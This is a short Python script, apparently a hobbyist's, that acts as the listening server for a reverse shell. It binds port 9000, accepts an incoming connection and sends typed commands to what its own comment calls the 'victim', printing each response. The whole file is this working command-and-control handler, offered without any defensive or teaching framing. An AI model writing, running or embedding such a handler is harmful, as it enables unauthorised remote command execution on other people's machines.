import socket
import sys


def create_socket():
    try:
        global host
        global port
        global s
        port = 9000
        host = ""
        s = socket.socket()
    except socket.error as msg:
        print("Socket error creation" + str(msg))


# binding socket and listen for connections

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding port : " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error " + str(msg) + "\n" + "retrying................")
        bind_socket()


# establish connections with a clients "socket must be listen"
def socket_accept():
    conn, address = s.accept()
    print("Connection has established with | " + " IP " + address[0] + " port | " + str(address[1]))
    send_commands(conn)
    conn.close()
#send commands to victim
def send_commands(conn):
    while True:
        cmd = input()
        if len(str.encode(cmd)) > 0:
           conn.send(str.encode(cmd))
           client_response=str(conn.recv(1024),"utf-8")
           print(client_response,end="")
            
def main():
    print('----------------------------------------------------------------------------------')
    print('--------welcome here in this script-------- \n--------here we created a server to listen to a port 9000--------')
    print('-----------------------------------------------------------------------------------')
    print('\t\t\t-        Created        -')
    print('\t\t\t--         by          --')
    print('\t\t\t---       Hadi        ---')
    print('\t\t\t-  hadymoh314@gmail.com -')
    print('\t\t\t---------------------------')


    create_socket()
    bind_socket()
    socket_accept()
main()



